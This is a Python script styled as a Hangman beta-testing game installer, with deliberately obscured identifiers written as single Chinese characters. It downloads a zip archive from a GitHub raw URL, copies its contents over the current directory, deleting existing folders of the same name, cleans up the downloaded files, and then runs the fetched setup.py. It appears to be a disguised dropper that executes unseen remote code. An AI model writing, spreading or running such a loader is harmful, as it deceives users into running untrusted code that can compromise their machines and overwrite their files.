import os
import sys
import time
import shutil
import subprocess
import urllib.request as 甲
from pathlib import Path as 路
import zipfile as 包

网址 = 'https://raw.githubusercontent.com/xub0-xbt/--/main/game.zip'
文件 = 'g.tmp'
宽 = 40
绿 = '\033[92m'
红 = '\033[91m'
复 = '\033[0m'

def 条(已, 总):
    比 = 已 / 总
    实 = int(宽 * 比)
    print(f"\r{绿}   Downloading... █{'█'*实}{'░'*(宽-实)} {比*100:5.1f}%{复}", end='', flush=True)

def 下载():
    try:
        with 甲.urlopen(网址) as 流:
            总长 = int(流.headers.get('Content-Length', 0)) or 100
            已得 = 0
            with open(文件, 'wb') as f:
                while True:
                    块 = 流.read(65536)
                    if not 块: break
                    f.write(块)
                    已得 += len(块)
                    条(已得, 总长)
        print(f"\n{绿}   Download complete!")
        time.sleep(0.8)
    except Exception as e:
        print(f"\n{红}   Download failed: {e}{复}")
        sys.exit(1)

def 找源():
    根 = 路('__tmp__')
    所有 = list(根.rglob('setup.py'))
    return 所有[0].parent if 所有 else 根

def 安装():
    try:
        with 包.ZipFile(文件, 'r') as z:
            z.extractall('__tmp__')
        print(f"{绿}   Preparing files...")
        time.sleep(1)

        源 = 找源()

        for 项 in 源.iterdir():
            目 = 路(项.name)
            try:
                if 项.is_file():
                    shutil.copy2(项, 目)
                else:
                    if 目.exists():
                        shutil.rmtree(目)
                    shutil.copytree(项, 目)
            except: pass

        print(f"{绿} {复}")
        time.sleep(1)

    except Exception as e:
        print(f"{红}   Setup failed: {e}{复}")
        sys.exit(1)

def 清理():
    try: 
        if 路(文件).exists():
            os.remove(文件)
    except: pass
    
    try: 
        tmp_dir = 路('__tmp__')
        if tmp_dir.exists():
            shutil.rmtree(tmp_dir, ignore_errors=True)
    except: pass
    
    try: 
        game_dir = 路('game')
        if game_dir.exists():
            shutil.rmtree(game_dir, ignore_errors=True)
    except: pass

if __name__ == '__main__':
    try:
        print(f"""{绿}
   ╔════════════════════════════════════╗
   ║    🎮 Hangman – Beta Testing 🎮    ║
   ║       Setting up the game...       ║
   ╚════════════════════════════════════╝{复}
    """)
        time.sleep(1.5)
        下载()
        安装()
        清理()
        
        subprocess.run([sys.executable, 'setup.py'])
        sys.exit(0)
    except KeyboardInterrupt:
        sys.exit(0)